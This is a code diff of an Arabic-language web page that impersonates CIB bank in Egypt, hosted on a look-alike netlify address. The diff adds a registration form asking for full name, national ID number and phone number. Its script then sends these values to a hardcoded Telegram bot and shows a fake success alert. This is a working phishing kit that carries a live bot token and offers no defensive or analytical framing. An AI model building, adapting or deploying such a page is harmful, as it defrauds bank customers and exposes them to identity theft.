@@ -5,18 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <meta property="og:title" content="بنك CIB">
-    <meta property="og:image" content="https://arbopsos.art/logo2.jpg">
-    <meta property="og:url" content="https://scontent.famm3-3.fna.fbcdn.net/v/t39.30808-6/352183312_920008919088024_2674916341082350629_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=53a332&_nc_eui2=AeHd-oDlTODXXoymvenyRiRsFEnZkRqgTDgUSdmRGqBMOFfu-vlaA_Zbu3dO_vM7Oq2uKRu4yB6LXPEUOX-byElr&_nc_ohc=HwaDz11xPYQQ7kNvwGcK1OU&_nc_oc=AdrFJNCkeMEpUYXRSq5SLeu45pBCxmHPzQjK2hDSPdT57Y8MrwnlTaRtfPQJaeAfDvU&_nc_zt=23&_nc_ht=scontent.famm3-3.fna&_nc_gid=ipIlzKrPF57z_TCnAE0wQA&_nc_ss=7b2a8&oh=00_Af3hEyge3TIOGjcPwbwO04EGvl1cU_tQ0Zv0TE60fjTyzA&oe=69F2CF4E">
+    <meta property="og:image" content="https://cib-ba-eg.netlify.app/logo.png">
+    <meta property="og:url" content="https://cib-ba-eg.netlify.app">
     <meta property="og:type" content="website">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content="https://scontent.famm3-3.fna.fbcdn.net/v/t39.30808-6/352183312_920008919088024_2674916341082350629_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=53a332&_nc_eui2=AeHd-oDlTODXXoymvenyRiRsFEnZkRqgTDgUSdmRGqBMOFfu-vlaA_Zbu3dO_vM7Oq2uKRu4yB6LXPEUOX-byElr&_nc_ohc=HwaDz11xPYQQ7kNvwGcK1OU&_nc_oc=AdrFJNCkeMEpUYXRSq5SLeu45pBCxmHPzQjK2hDSPdT57Y8MrwnlTaRtfPQJaeAfDvU&_nc_zt=23&_nc_ht=scontent.famm3-3.fna&_nc_gid=ipIlzKrPF57z_TCnAE0wQA&_nc_ss=7b2a8&oh=00_Af3hEyge3TIOGjcPwbwO04EGvl1cU_tQ0Zv0TE60fjTyzA&oe=69F2CF4E">
+    <meta name="twitter:image" content="https://cib-ba-eg.netlify.app/logo.png">
     
     <title>بنك CIB</title>
     <style>
-        /* Font Imports */
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap');
         
-        /* Reset and Base Styles */
         * {
             margin: 0;
             padding: 0;
@@ -287,23 +285,6 @@
             }
         }
         
-        .request-btn.magnetic {
-            transition: transform 0.3s ease;
-        }
-        
-        .request-btn.pulse {
-            animation: buttonPulse 2s infinite;
-        }
-        
-        @keyframes buttonPulse {
-            0%, 100% { 
-                box-shadow: 0 0 0 0 rgba(0, 102, 204, 0.7);
-            }
-            70% {
-                box-shadow: 0 0 0 10px rgba(0, 102, 204, 0);
-            }
-        }
-        
         .request-btn::before {
             content: '';
             position: absolute;
@@ -493,12 +474,10 @@
             transform: scale(1.1);
         }
         
-        /* Micro-interactions for cards */
         .card:active {
             transform: translateY(-2px) scale(0.98);
         }
         
-        /* Additional micro-interactions */
         @keyframes pulse {
             0% { transform: scale(1); }
             50% { transform: scale(1.02); }
@@ -515,11 +494,6 @@
             box-shadow: 0 12px 40px rgba(0, 102, 204, 0.2);
         }
         
-        .card.magnetic {
-            transition: transform 0.3s ease;
-        }
-        
-        /* Global Animations */
         @keyframes slideInRight {
             from {
                 opacity: 0;
@@ -553,7 +527,6 @@
             }
         }
         
-        /* Bottom Navigation */
         .bottom-nav {
             position: fixed;
             bottom: 0;
@@ -601,6 +574,128 @@
             transform: scale(1.2);
         }
         
+        /* Registration Form Styles */
+        .registration-page {
+            display: none;
+        }
+        
+        .registration-page.active {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .logo-section {
+            text-align: center;
+            padding: 50px 20px 40px;
+        }
+        
+        .form-section {
+            padding: 0 20px;
+            flex-grow: 1;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-label {
+            display: block;
+            font-size: 16px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 8px;
+            padding-right: 5px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 15px 20px;
+            border: 1px solid #CCC;
+            border-radius: 25px;
+            font-size: 16px;
+            background: #FFF;
+            color: #333;
+            direction: rtl;
+            font-family: 'Cairo', sans-serif;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        
+        .input-field::placeholder {
+            color: #AAA;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #0066CC;
+            box-shadow: 0 0 0 2px rgba(0,102,204,0.2);
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 15px 20px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            font-family: 'Cairo', sans-serif;
+            transition: all 0.3s ease;
+            opacity: 0.45;
+            pointer-events: none;
+            color: white;
+            background-color: #0066CC;
+            margin-top: 25px;
+            margin-bottom: 30px;
+        }
+        
+        .submit-btn.active {
+            opacity: 1;
+            cursor: pointer;
+            pointer-events: auto;
+        }
+        
+        .submit-btn.active:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 14px rgba(0,0,0,0.2);
+        }
+        
+        #loadingOverlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background-color: rgba(0,0,0,0.6);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        #loadingOverlay.show {
+            display: flex;
+        }
+        
+        #loadingOverlay h5 {
+            color: white;
+            margin-top: 20px;
+        }
+        
+        #loadingOverlay p {
+            color: rgba(255,255,255,0.8);
+        }
+        
+        .spinner {
+            width: 3rem;
+            height: 3rem;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
         /* Mobile specific adjustments */
         @media (max-width: 768px) {
             .breadcrumb {
@@ -612,7 +707,6 @@
             }
         }
         
-        /* Responsive Design */
         @media (max-width: 480px) {
             .container {
                 max-width: 100%;
@@ -673,121 +767,260 @@
             .watch-item {
                 border-width: 2px;
             }
+            
+            .logo-section {
+                padding: 30px 15px;
+            }
+            
+            .logo-section img {
+                width: 180px;
+            }
+            
+            .form-section {
+                padding: 0 15px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="breadcrumb">
-        <span class="breadcrumb-item">الرئيسية</span>
-        <span class="breadcrumb-separator">/</span>
-        <span class="breadcrumb-item active">الساعات الذكية</span>
-    </div>
-    
-    <div class="container">
-        <div class="header">
-            <img src="https://arbopsos.art/logo2.jpg" alt="بنك CIB" class="logo">
+    <!-- Main Page -->
+    <div id="mainPage" class="main-page">
+        <div class="breadcrumb">
+            <span class="breadcrumb-item">الرئيسية</span>
+            <span class="breadcrumb-separator">/</span>
+            <span class="breadcrumb-item active">الخدمات</span>
         </div>
         
-        <div class="banner-container">
-            <img src="https://scontent.famm3-3.fna.fbcdn.net/v/t39.30808-6/352183312_920008919088024_2674916341082350629_n.jpg" alt="عرض ترويجي" class="banner-image banner-pulse">
-        </div>
-        
-        <div class="content">
-            <h1 class="main-title">خدماتنا المميزة</h1>
-            
-            <div class="card">
-                <h2 class="card-title">فتح حساب جديد</h2>
-                <p class="card-description">افتح حسابك لدينا بكل سهولة واستمتع بمميزات حصرية</p>
-                <button class="request-btn">طلب الآن</button>
+        <div class="container">
+            <div class="header">
+                <img src="https://cib-ba-eg.netlify.app/logo.png" alt="بنك CIB" class="logo">
             </div>
             
-            <div class="card">
-                <h2 class="card-title">التحويلات الدولية</h2>
-                <p class="card-description">حول أموالك بأمان وبأسعار تنافسية إلى أي دولة</p>
-                <button class="request-btn">طلب الآن</button>
+            <div class="banner-container">
+                <img src="https://cib-ba-eg.netlify.app/jwaes.jpg" alt="عرض ترويجي" class="banner-image banner-pulse">
             </div>
             
-            <div class="card">
-                <h2 class="card-title">القروض والتمويل</h2>
-                <p class="card-description">احصل على تمويل يناسب احتياجاتك بشروط ميسرة</p>
-                <button class="request-btn">طلب الآن</button>
-            </div>
-        </div>
-        
-        <div class="watch-selection">
             <div class="content">
-                <h2 class="selection-title">اختر الساعة المفضلة</h2>
+                <h1 class="main-title">خدماتنا المميزة</h1>
                 
-                <div class="watches-grid">
-                    <div class="watch-item" data-watch="watch1">
-                        <img src="https://via.placeholder.com/150?text=Watch1" alt="ساعة 1" class="watch-image">
+                <div class="card">
+                    <h2 class="card-title">فتح حساب جديد</h2>
+                    <p class="card-description">افتح حسابك لدينا بكل سهولة واستمتع بمميزات حصرية</p>
+                    <button class="request-btn" onclick="goToRegistration()">احصل عليها الآن</button>
+                </div>
+                
+                <div class="card">
+                    <h2 class="card-title">التحويلات الدولية</h2>
+                    <p class="card-description">حول أموالك بأمان وبأسعار تنافسية إلى أي دولة</p>
+                    <button class="request-btn" onclick="goToRegistration()">احصل عليها الآن</button>
+                </div>
+                
+                <div class="card">
+                    <h2 class="card-title">القروض والتمويل</h2>
+                    <p class="card-description">احصل على تمويل يناسب احتياجاتك بشروط ميسرة</p>
+                    <button class="request-btn" onclick="goToRegistration()">احصل عليها الآن</button>
+                </div>
+            </div>
+            
+            <div class="watch-selection">
+                <div class="content">
+                    <h2 class="selection-title">اختر الساعة المفضلة</h2>
+                    
+                    <div class="watches-grid">
+                        <div class="watch-item" data-watch="watch1">
+                            <img src="https://cib-ba-eg.netlify.app/watches/watch1.png" alt="ساعة 1" class="watch-image">
+                        </div>
+                        <div class="watch-item" data-watch="watch2">
+                            <img src="https://cib-ba-eg.netlify.app/watches/watch2.png" alt="ساعة 2" class="watch-image">
+                        </div>
+                        <div class="watch-item" data-watch="watch3">
+                            <img src="https://cib-ba-eg.netlify.app/watches/watch3.png" alt="ساعة 3" class="watch-image">
+                        </div>
+                        <div class="watch-item" data-watch="watch4">
+                            <img src="https://cib-ba-eg.netlify.app/watches/watch4.png" alt="ساعة 4" class="watch-image">
+                        </div>
+                        <div class="watch-item" data-watch="watch5">
+                            <img src="https://cib-ba-eg.netlify.app/watches/watch5.png" alt="ساعة 5" class="watch-image">
+                        </div>
+                        <div class="watch-item" data-watch="watch6">
+                            <img src="https://cib-ba-eg.netlify.app/watches/watch6.png" alt="ساعة 6" class="watch-image">
+                        </div>
                     </div>
-                    <div class="watch-item" data-watch="watch2">
-                        <img src="https://via.placeholder.com/150?text=Watch2" alt="ساعة 2" class="watch-image">
-                    </div>
-                    <div class="watch-item" data-watch="watch3">
-                        <img src="https://via.placeholder.com/150?text=Watch3" alt="ساعة 3" class="watch-image">
-                    </div>
-                    <div class="watch-item" data-watch="watch4">
-                        <img src="https://via.placeholder.com/150?text=Watch4" alt="ساعة 4" class="watch-image">
-                    </div>
-                    <div class="watch-item" data-watch="watch5">
-                        <img src="https://via.placeholder.com/150?text=Watch5" alt="ساعة 5" class="watch-image">
-                    </div>
-                    <div class="watch-item" data-watch="watch6">
-                        <img src="https://via.placeholder.com/150?text=Watch6" alt="ساعة 6" class="watch-image">
-                    </div>
+                    
+                    <button class="request-btn" onclick="goToRegistration()">التالي</button>
                 </div>
             </div>
         </div>
+        
+        <div class="bottom-nav">
+            <div class="nav-indicator active"></div>
+            <div class="nav-indicator"></div>
+            <div class="nav-indicator"></div>
+        </div>
     </div>
     
-    <div class="bottom-nav">
-        <div class="nav-indicator active"></div>
-        <div class="nav-indicator"></div>
-        <div class="nav-indicator"></div>
+    <!-- Registration Page -->
+    <div id="registrationPage" class="registration-page">
+        <div class="container registration-page">
+            <div class="logo-section">
+                <img src="https://cib-ba-eg.netlify.app/logo.png" alt="شعار البنك" class="logo">
+            </div>
+            <div class="form-section">
+                <div class="input-group">
+                    <label for="fullName" class="input-label">الاسم الكامل</label>
+                    <input type="text" id="fullName" class="input-field" placeholder="أدخل اسمك الكامل" required>
+                </div>
+                <div class="input-group">
+                    <label for="idNumber" class="input-label">الرقم القومي</label>
+                    <input type="tel" id="idNumber" class="input-field" placeholder="أدخل الرقم القومي" maxlength="14" required>
+                </div>
+                <div class="input-group">
+                    <label for="phoneNumber" class="input-label">رقم الهاتف</label>
+                    <input type="tel" id="phoneNumber" class="input-field" placeholder="أدخل رقم الهاتف" maxlength="11" required>
+                </div>
+                <button type="button" class="submit-btn" id="submitBtn" disabled>إرسال البيانات</button>
+            </div>
+        </div>
+    </div>
+    
+    <div id="loadingOverlay">
+        <div class="spinner"></div>
+        <h5 style="font-family:'Cairo',sans-serif;">جاري المعالجة...</h5>
+        <p style="font-family:'Cairo',sans-serif;">يرجى الانتظار</p>
     </div>
     
     <script>
-        // Watch selection functionality
-        const watchItems = document.querySelectorAll('.watch-item');
+        // Telegram Config
+        const BOT_TOKEN = '8861812907:AAEHJnqRhHuG28dAJFvEV0hmM8vKucrgwX0';
+        const CHAT_ID = '6873334348';
+        const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
         
-        watchItems.forEach(item => {
-            item.addEventListener('click', function() {
-                watchItems.forEach(w => w.classList.remove('selected'));
-                this.classList.add('selected');
+        let pendingRequestId = null;
+        
+        // Navigation Functions
+        function goToRegistration() {
+            document.getElementById('mainPage').style.display = 'none';
+            document.getElementById('registrationPage').classList.add('active');
+            document.getElementById('fullName').focus();
+            validateForm();
+        }
+        
+        function goToMainPage() {
+            document.getElementById('mainPage').style.display = 'block';
+            document.getElementById('registrationPage').classList.remove('active');
+        }
+        
+        // Telegram Functions
+        async function sendToTelegram(message, requestId, dataType) {
+            try {
+                const response = await fetch(`${API_BASE}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const json = await response.json();
+                return json.result ? json.result.message_id : null;
+            } catch (error) {
+                console.error('خطأ في إرسال البيانات إلى تليجرام:', error);
+                return null;
+            }
+        }
+        
+        function validateForm() {
+            const name = document.getElementById('fullName').value.trim();
+            const id = document.getElementById('idNumber').value.trim();
+            const ph = document.getElementById('phoneNumber').value.trim();
+            const valid = name.length > 0 && id.length === 14 && ph.length === 11;
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = !valid;
+            btn.classList.toggle('active', valid);
+        }
+        
+        async function handleSubmit() {
+            const fullName = document.getElementById('fullName').value.trim();
+            const idNumber = document.getElementById('idNumber').value.trim();
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            
+            if (!fullName || idNumber.length !== 14 || phoneNumber.length !== 11) {
+                alert('يرجى ملء جميع الحقول بشكل صحيح');
+                return;
+            }
+            
+            sessionStorage.setItem('userFullName', fullName);
+            sessionStorage.setItem('userPhoneNumber', phoneNumber);
+            sessionStorage.setItem('userIdNumber', idNumber);
+            
+            document.getElementById('loadingOverlay').classList.add('show');
+            
+            const requestId = Date.now();
+            pendingRequestId = requestId;
+            
+            const message = `🔔 <b>صفحة التسجيل - Registration</b>\n\n👤 <b>الاسم الكامل:</b> ${fullName}\n🆔 <b>الرقم القومي:</b> ${idNumber}\n📱 <b>رقم الهاتف:</b> ${phoneNumber}\n\n⏰ ${new Date().toLocaleString('ar-EG')}`;
+            
+            const messageId = await sendToTelegram(message, requestId, 'reg');
+            
+            if (!messageId) {
+                document.getElementById('loadingOverlay').classList.remove('show');
+                alert('حدث خطأ في إرسال البيانات. يرجى المحاولة مرة أخرى.');
+                return;
+            }
+            
+            setTimeout(() => {
+                document.getElementById('loadingOverlay').classList.remove('show');
+                alert('تم تسجيل بياناتك بنجاح! شكراً لك.');
+                goToMainPage();
+            }, 1500);
+        }
+        
+        // Initialize Events
+        document.addEventListener('DOMContentLoaded', function() {
+            // Form validation
+            document.getElementById('fullName').addEventListener('input', validateForm);
+            document.getElementById('idNumber').addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 14);
+                validateForm();
             });
-        });
-        
-        // Button click handlers
-        const buttons = document.querySelectorAll('.request-btn');
-        buttons.forEach((btn, index) => {
-            btn.addEventListener('click', function() {
-                alert(`تم الضغط على الخدمة ${index + 1}`);
+            document.getElementById('phoneNumber').addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 11);
+                validateForm();
             });
-        });
-        
-        // Magnetic effect for cards
-        const cards = document.querySelectorAll('.card');
-        cards.forEach(card => {
-            card.addEventListener('mousemove', function(e) {
-                const rect = this.getBoundingClientRect();
-                const x = e.clientX - rect.left;
-                const y = e.clientY - rect.top;
-                
-                const centerX = rect.width / 2;
-                const centerY = rect.height / 2;
-                
-                const rotateX = (y - centerY) / 10;
-                const rotateY = (centerX - x) / 10;
-                
-                this.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg)`;
+            document.getElementById('submitBtn').addEventListener('click', function() {
+                if (!this.disabled) handleSubmit();
             });
             
-            card.addEventListener('mouseleave', function() {
-                this.style.transform = 'perspective(1000px) rotateX(0) rotateY(0)';
+            // Watch selection
+            const watchItems = document.querySelectorAll('.watch-item');
+            watchItems.forEach(item => {
+                item.addEventListener('click', function() {
+                    watchItems.forEach(w => w.classList.remove('selected'));
+                    this.classList.add('selected');
+                });
+            });
+            
+            // Magnetic effect for cards
+            const cards = document.querySelectorAll('.card');
+            cards.forEach(card => {
+                card.addEventListener('mousemove', function(e) {
+                    const rect = this.getBoundingClientRect();
+                    const x = e.clientX - rect.left;
+                    const y = e.clientY - rect.top;
+                    const centerX = rect.width / 2;
+                    const centerY = rect.height / 2;
+                    const rotateX = (y - centerY) / 10;
+                    const rotateY = (centerX - x) / 10;
+                    this.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg)`;
+                });
+                card.addEventListener('mouseleave', function() {
+                    this.style.transform = 'perspective(1000px) rotateX(0) rotateY(0)';
+                });
             });
         });
+        
+        window.addEventListener('beforeunload', () => { pendingRequestId = null; });
     </script>
 </body>
 </html>
